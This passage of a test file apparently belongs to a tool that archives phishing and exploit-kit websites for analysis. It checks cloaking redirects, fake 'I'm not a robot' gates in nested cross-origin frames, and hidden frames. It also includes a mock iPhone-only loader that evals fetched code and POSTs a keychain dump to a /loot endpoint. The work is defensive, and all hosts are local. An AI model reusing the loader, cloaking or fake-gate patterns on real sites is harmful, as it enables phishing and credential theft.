					if (pathname === "/phone") return html(`<form method="POST" action="/phone-check"><input type="tel" id="phone"><input type="hidden" name="phone" id="phone-value"><button>Next</button></form>
<script>document.getElementById("phone").addEventListener("input", (event) => { document.getElementById("phone-value").value = event.target.value; });</script>`);
					if (pathname === "/signin") return html(signIn);
					return html(`<form method="POST" action="/email"><input type="email" name="email"><button>Next</button></form>`);
				},
			});
			try {
				const phone = "+12125550142";
				const { pages } = await visit(`http://127.0.0.1:${server.port}/`, [
					fill({ ref: "f1", control: "input[type=email]", name: "email" }),
					fill({ ref: "f1", control: "input[type=tel]", id: "phone" }, phone),
				]);
				expect(posts).toEqual([{ path: "/email", body: { email: value } }, { path: "/phone-check", body: { phone } }]);
				expect(pages.map((page) => page.navigationHops.map(({ url, status }) => ({ path: new URL(url).pathname, status })))).toEqual([
					[{ path: "/email", status: 303 }, { path: "/phone", status: 200 }],
					[{ path: "/phone-check", status: 303 }, { path: "/signin", status: 200 }],
				]);
				expect(pages[1]!.performedAction).toMatchObject({ value: phone });
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("never clicks a disabled or hidden button that only carries the caption, and never fills an off-screen honeypot", async () => {
			const server = Bun.serve({
				port: 0,
				fetch: () => html(`<button disabled>Confirm</button><button style="display:none">Confirm</button><div role="button" style="visibility:hidden">Confirm</div>
<input type="text" name="website" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0">`),
			});
			try {
				const url = `http://127.0.0.1:${server.port}/`;
				const missingClick = await visit(url, [click("Confirm")]).catch((caught: unknown) => caught);
				expect(missingClick).toBeInstanceOf(WebsiteCaptureFailedError);
				expect((missingClick as Error).message).toBe(`Failed to load page: the page showed no button "Confirm" to click via Tor exit`);
				const missingField = await visit(url, [fill({ ref: "f1", control: "input[type=text]", name: "website" })]).catch((caught: unknown) => caught);
				expect((missingField as Error).message).toBe(`Failed to load page: the page showed no field "website" to enter the value into via Tor exit`);
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("a capture made without keepSession, and every route not returned, closes its browser", async () => {
			const kit = serveKit();
			try {
				const browsers: Browser[] = [];
				const archive = await archiveWebsite({ url: kit.url }, { ...fast, renderSettleMs: 1_000, getBrowser: async () => { const browser = await launch(); browsers.push(browser); return browser; } });
				expect(archive.session).toBeUndefined();
				expect(browsers.map((browser) => browser.connected)).toEqual([false]);
			} finally {
				kit.server.stop(true);
			}
		}, 60_000);

		test("acting after the session is closed fails instead of opening a new visit", async () => {
			const kit = serveKit();
			try {
				const first = await archiveWebsite({ url: kit.url, keepSession: true }, { ...fast, renderSettleMs: 1_000, getBrowser: launch });
				await first.session!.close();
				await first.session!.close();
				await expect(first.session!.act(click("Confirm"))).rejects.toThrow("The capture's browser is already closed.");
			} finally {
				kit.server.stop(true);
			}
		}, 60_000);
	});

	test("records a jump the page's <head> makes to another site before it finishes loading as the submitted page's own hop", async () => {
		// docusign.alt3-doc3ea7-v2.sbs: meta refresh and `location.replace` to a news
		// site in <head>. Chromium's navigation resolves with the news site's response.
		const decoyHits: string[] = [];
		const decoy = serveKit(`<!DOCTYPE html><html><body><h1>World news</h1></body></html>`, decoyHits);
		const decoyUrl = `http://127.0.0.1:${decoy.port}/`;
		const hits: string[] = [];
		const cloaker = serveKit(`<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=${decoyUrl}"><title>Redirecting...</title><script>window.location.replace("${decoyUrl}");</script></head><body></body></html>`, hits);
		try {
			const url = `http://localhost:${cloaker.port}/word/verify.workspace.php`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 2_000, getBrowser: launch });

			expect(archive.url).toBe(decoyUrl);
			expect(archive.navigationHops).toEqual([
				expect.objectContaining({ index: 0, url, status: 200, redirectTo: decoyUrl, contentCaptured: false }),
				expect.objectContaining({ index: 1, url: decoyUrl, status: 200, contentCaptured: true }),
			]);
			// Every route of this test browser reaches the same decoy.
			expect(archive.cloaking).toEqual({
				outcome: "uniform",
				detail: `${url} sent both the Tor exit and the residential exit to 127.0.0.1 by script`,
			});
			expect(hits).toEqual(["/word/verify.workspace.php", "/word/verify.workspace.php"]);
		} finally {
			cloaker.stop(true);
			decoy.stop(true);
		}
	}, 60_000);

	test("never clicks anything on a page that already shows data-entry fields, even next to a robot checkbox", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body>${appleForm}
<label><input type="checkbox" id="robot" onclick="fetch('/verify', { method: 'POST' })"> I'm not a robot</label></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/login` }, { ...fast, renderSettleMs: 1_000, getBrowser: launch });

			expect(archive.verificationGate).toBeUndefined();
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(hits).toEqual(["/login"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	/**
	 * A Google Sites page whose Apps Script embed draws the kit's gate two
	 * frames deep, each frame on its own origin, like sites.google.com →
	 * script.google.com → *-script.googleusercontent.com. A hidden second embed
	 * loads the same gate; a visitor never sees it, so it is no second control.
	 */
	function serveFramedKit(gatePage: string, hits: string[]) {
		const kit = Bun.serve({
			port: 0,
			fetch: async (request) => {
				const { pathname } = new URL(request.url);
				hits.push(`kit${pathname}`);
				if (pathname === "/verify") return Response.json({ ok: true });
				if (pathname === "/login-form") return new Response(appleForm, { headers: { "content-type": "text/html" } });
				return new Response(gatePage, { headers: { "content-type": "text/html; charset=utf-8" } });
			},
		});
		const sandbox = Bun.serve({
			port: 0,
			fetch: () => new Response(`<!DOCTYPE html><html><body style="margin:0"><iframe id="userHtmlFrame" src="http://127.0.0.1:${kit.port}/userCodeAppPanel" style="border:0;width:100%;height:600px"></iframe></body></html>`, { headers: { "content-type": "text/html" } }),
		});
		const site = Bun.serve({
			port: 0,
			fetch: () => new Response(`<!DOCTYPE html><html><head><title>Revert apps</title></head><body><header><input type="search" aria-label="Search this site"></header>
<h1>Revert apps</h1><iframe aria-label="Apps Script" src="http://localhost:${sandbox.port}/exec" style="border:0;width:800px;height:620px"></iframe>
<iframe src="http://localhost:${sandbox.port}/preload" style="display:none"></iframe><footer>Report abuse</footer></body></html>`, { headers: { "content-type": "text/html" } }),
		});
		return { url: `http://127.0.0.1:${site.port}/view/revert-change`, stop: () => [kit, sandbox, site].forEach((server) => server.stop(true)) };
	}

	test("clicks a gate drawn in a nested cross-origin frame and captures the sign-in page it reveals there", async () => {
		const hits: string[] = [];
		const served = serveFramedKit(`<!DOCTYPE html><html><head><title>Security Verification</title></head><body>
<div id="gate"><h1>google.com</h1><h2>Performing security verification</h2>
<div class="cb" id="checkbox" role="checkbox" aria-checked="false" tabindex="0" style="width:24px;height:24px;border:2px solid #555"></div><span>I'm not a robot</span>
<div>reCAPTCHA</div></div><div id="content"></div>
<script>
document.getElementById("checkbox").addEventListener("click", async () => {
	await fetch("/verify", { method: "POST" });
	const html = await (await fetch("/login-form")).text();
	document.getElementById("gate").remove();
	document.getElementById("content").innerHTML = html;
});
</script></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: served.url }, { ...fast, renderSettleMs: 5_000, getBrowser: launch });

			// The empty role=checkbox control takes its caption from the span drawn beside it.
			expect(archive.verificationGate).toEqual({ label: "I'm not a robot" });
			expect(hits).toEqual(["kit/userCodeAppPanel", "kit/userCodeAppPanel", "kit/verify", "kit/login-form"]);
			const text = archive.text.toString();
			expect(text).toContain("Revert apps");
			expect(text).toContain("Sign in with Apple Account");
			expect(text).toContain("Email or Phone Number");
			expect(text).not.toContain("Performing security verification");
			expect(archive.url).toBe(served.url);
		} finally {
			served.stop();
		}
	}, 60_000);

	test("follows a framed gate that navigates its frame to the kit on another site", async () => {
		// The revert-change kit: clicking the checkbox sends the Apps Script frame to revert-app.com's sign-in page.
		const hits: string[] = [];
		const kitSite = Bun.serve({
			port: 0,
			fetch: async (request) => {
				hits.push(`kit-site${new URL(request.url).pathname}`);
				// The kit fetches its form after load, so the frame shows it only once that request returns.
				return new Response(`<!DOCTYPE html><html><body><div id="app"></div><script>
fetch("/session").then(() => { document.getElementById("app").innerHTML = ${JSON.stringify(appleForm)}; });
</script></body></html>`, { headers: { "content-type": "text/html" } });
			},
		});
		const served = serveFramedKit(`<!DOCTYPE html><html><body><h2>Performing security verification</h2>
<div id="checkbox" role="checkbox" tabindex="0" style="width:24px;height:24px;border:2px solid #555"></div><span>I'm not a robot</span>
<script>document.getElementById("checkbox").addEventListener("click", () => { setTimeout(() => { location.href = "http://127.0.0.1:${kitSite.port}/?k=token"; }, 300); });</script>
</body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: served.url }, { ...fast, renderSettleMs: 5_000, getBrowser: launch });

			expect(archive.verificationGate).toEqual({ label: "I'm not a robot" });
			expect(hits).toContain("kit-site/session");
			const text = archive.text.toString();
			expect(text).toContain("Revert apps");
			expect(text).toContain("Email or Phone Number");
			expect(text).not.toContain("Performing security verification");
			// The submitted page is still the captured site; the kit lives in its frame.
			expect(archive.url).toBe(served.url);
		} finally {
			served.stop();
			kitSite.stop(true);
		}
	}, 60_000);

	test("never clicks a framed robot checkbox when a frame already shows a sign-in form", async () => {
		const hits: string[] = [];
		const served = serveFramedKit(`<!DOCTYPE html><html><body>${appleForm}
<label><input type="checkbox" onclick="fetch('/verify', { method: 'POST' })"> I'm not a robot</label></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: served.url }, { ...fast, renderSettleMs: 1_000, getBrowser: launch });

			expect(archive.verificationGate).toBeUndefined();
			expect(hits).toEqual(["kit/userCodeAppPanel", "kit/userCodeAppPanel"]);
			// The framed form is still captured as the page shows it.
			expect(archive.text.toString()).toContain("Email or Phone Number");
		} finally {
			served.stop();
		}
	}, 60_000);

	test("never clicks a real captcha provider's checkbox", async () => {
		// Real reCAPTCHA draws its own "I'm not a robot" checkbox inside google.com/recaptcha; it is a challenge, not a kit's gate.
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><h1>Please wait</h1>
<iframe src="https://www.google.com/recaptcha/api2/anchor?k=test" style="width:304px;height:78px"></iframe></body></html>`, hits);
		const providerFrames: string[] = [];
		try {
			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/wait` }, {
				...fast,
				renderSettleMs: 1_000,
				getBrowser: async () => {
					const browser = await launch();
					const newPage = browser.defaultBrowserContext().newPage.bind(browser.defaultBrowserContext());
					// Serve the provider frame locally so the test never reaches Google; it draws the real widget's caption.
					browser.defaultBrowserContext().newPage = async () => {
						const page = await newPage();
						await page.setRequestInterception(true);
						page.on("request", (request) => {
							if (!request.url().startsWith("https://www.google.com/recaptcha/")) return void request.continue();
							providerFrames.push(request.url());
							void request.respond({ status: 200, contentType: "text/html", body: `<html><body><div role="checkbox" id="recaptcha-anchor" tabindex="0" style="width:28px;height:28px" onclick="fetch('http://127.0.0.1:${server.port}/verify', { method: 'POST', mode: 'no-cors' })"></div><label for="recaptcha-anchor">I'm not a robot</label></body></html>` });
						});
						return page;
					};
					return browser;
				},
			});

			expect(providerFrames).toHaveLength(1);
			expect(archive.verificationGate).toBeUndefined();
			expect(hits).toEqual(["/wait"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("leaves a page alone when more than one control could be the gate", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><h1>Choose</h1>
<button onclick="fetch('/verify', { method: 'POST' })">I'm not a robot</button>
<button onclick="fetch('/verify', { method: 'POST' })">Verify you are human</button></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/two` }, { ...fast, renderSettleMs: 1_000, getBrowser: launch });

			expect(archive.verificationGate).toBeUndefined();
			expect(hits).toEqual(["/two"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);
});

describe.skipIf(!chromiumAvailable)("hidden frames and the phone identity, in a real browser", () => {
	/**
	 * A mobile-only exploit kit like 92haoyun.icu (production case
	 * 377486973465530391), served locally: a decoy page that turns desktops
	 * away, a 0×0 frame whose loader acts only on an iPhone, and frames that are
	 * hidden in other ways or not at all.
	 */
	function serveExploitKit(hits: Array<{ path: string; method: string; userAgent: string }>) {
		// The beacon is what Cloudflare injects into each page it proxies: code
		// the markup loads, never a stage of the loader.
		const loader = `<html><body><script defer src="/beacon.min.js/v123" data-cf-beacon='{"token":"t"}'></script><script>
const ua = navigator.userAgent;
const version = /iPhone OS ([0-9_]+)/.exec(ua)?.[1];
if (version) {
	fetch("/pe/stage.js").then((r) => r.text()).then((code) => {
		eval(code);
		const main = document.createElement("script");
		main.src = "/pe_main.js?v=" + Date.now();
		document.head.appendChild(main);
		const kc = window.readKeychain();
		fetch("/loot", { method: "POST", body: JSON.stringify({ cmd: "keychain_dump", data: kc }) });
	});
}
</script><iframe src="/nested"></iframe></body></html>`;
		const decoy = `<html><body><main><h1>Security verification in progress</h1><p id="who"></p><button>Verify</button></main>
<iframe src="/visible" style="width:300px;height:200px;border:0"></iframe>
<iframe src="/gooll" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>
<iframe src="/none" style="display:none"></iframe>
<iframe src="/off" style="position:absolute;left:-5000px;width:300px;height:300px"></iframe>
<script>
const phone = navigator.userAgentData === undefined && navigator.maxTouchPoints > 0 && screen.width === 393 && /iPhone/.test(navigator.platform);
document.getElementById("who").textContent = phone ? "Opened on an iPhone." : "This site isn't available on desktop. Please scan the QR code.";
</script></body></html>`;
		const pages: Record<string, [string, string]> = {
			"/": [decoy, "text/html"],
			"/gooll": [loader, "text/html"],
			"/nested": ["<html><body>nested helper</body></html>", "text/html"],
			"/visible": ["<html><body><p>A frame the visitor sees</p></body></html>", "text/html"],
			"/none": ["<html><body>display none</body></html>", "text/html"],
			"/off": ["<html><body>far away</body></html>", "text/html"],
			// A stage is code, not a 2-byte telemetry "ok"; a real one is hundreds of KB.
			"/pe/stage.js": [`window.readKeychain = () => [];\n${"// stage padding\n".repeat(8)}`, "application/javascript"],
		};
		return Bun.serve({
			port: 0,
			fetch: (request) => {
				const { pathname } = new URL(request.url);
				hits.push({ path: pathname, method: request.method, userAgent: request.headers.get("user-agent") ?? "" });
				if (pathname === "/loot") return new Response("ok");
				const page = pages[pathname];
				return page ? new Response(page[0], { headers: { "content-type": page[1] } }) : new Response("missing", { status: 404 });
			},
		});
	}

	const launch = async () => puppeteer.launch({ executablePath: chromiumExecutable, headless: true, args: ["--no-first-run"] });

	test("a desktop capture records every frame no visitor sees with its source, but not the visible one, and the loader's iPhone branch stays unrun", async () => {
		const hits: Array<{ path: string; method: string; userAgent: string }> = [];
		const server = serveExploitKit(hits);
		try {
			const origin = `http://127.0.0.1:${server.port}`;
			const archive = await archiveWebsite({ url: `${origin}/` }, { ...fast, renderSettleMs: 5_000, getBrowser: launch });

			expect(archive.device).toBeUndefined();
			expect(archive.text.toString()).toContain("This site isn't available on desktop.");
			const frames = archive.hiddenFrames ?? [];
			expect(frames.map(({ ref, url, hiddenBy }) => ({ ref, url, hiddenBy }))).toEqual([
				{ ref: "frame1", url: `${origin}/gooll`, hiddenBy: "0×0 size" },
				{ ref: "frame2", url: `${origin}/nested`, hiddenBy: "inside a hidden frame (0×0 size)" },
				{ ref: "frame3", url: `${origin}/none`, hiddenBy: "display: none" },
				{ ref: "frame4", url: `${origin}/off`, hiddenBy: "positioned off-screen" },
			]);
			const gooll = frames[0]!;
			// The document as received, scripts included: the MHTML would have none of it.
			expect(gooll.source).toContain('/iPhone OS ([0-9_]+)/.exec(ua)');
			expect(gooll.sha256).toBe(createHash("sha256").update(gooll.source).digest("hex"));
			expect(gooll.userAgent).toContain("Windows NT 10.0");
			expect(gooll.signals).toEqual({
				platformGate: ["iPhone OS"],
				runsFetchedCode: true,
				// The nested frame's document is that frame's own, not a stage of the loader.
				stageUrls: [],
				dataUploads: [{ url: `${origin}/loot`, data: ["keychain"], observed: false }],
			});
			expect(gooll.sentRequests).toEqual([]);
			expect(hits.some(({ path }) => path === "/pe/stage.js" || path === "/loot")).toBe(false);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("an iPhone capture is Safari on iOS 18.6.2 to the page and its server, and records the stages the loader fetched and the data it sent", async () => {
		const hits: Array<{ path: string; method: string; userAgent: string }> = [];
		const server = serveExploitKit(hits);
		try {
			const origin = `http://127.0.0.1:${server.port}`;
			const archive = await archiveWebsite({ url: `${origin}/`, device: "iphone" }, { ...fast, renderSettleMs: 5_000, getBrowser: launch });

			expect(archive.device).toBe("iphone");
			expect(archive.text.toString()).toContain("Opened on an iPhone.");
			expect(new Set(hits.map(({ userAgent }) => userAgent))).toEqual(new Set([IPHONE_USER_AGENT]));
			expect(hits).toContainEqual({ path: "/loot", method: "POST", userAgent: IPHONE_USER_AGENT });

			const gooll = archive.hiddenFrames!.find(({ url }) => url === `${origin}/gooll`)!;
			expect(gooll.userAgent).toBe(IPHONE_USER_AGENT);
			expect(gooll.resources.map(({ url, type, status }) => ({ url, type, status }))).toContainEqual({ url: `${origin}/pe/stage.js`, type: "fetch", status: 200 });
			expect(gooll.sentRequests).toEqual([{ url: `${origin}/loot`, method: "POST", body: '{"cmd":"keychain_dump","data":[]}' }]);
			expect(gooll.signals.stageUrls).toContain(`${origin}/pe/stage.js`);
			expect(gooll.signals.dataUploads).toEqual([{ url: `${origin}/loot`, data: ["keychain"], observed: true }]);
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);
});
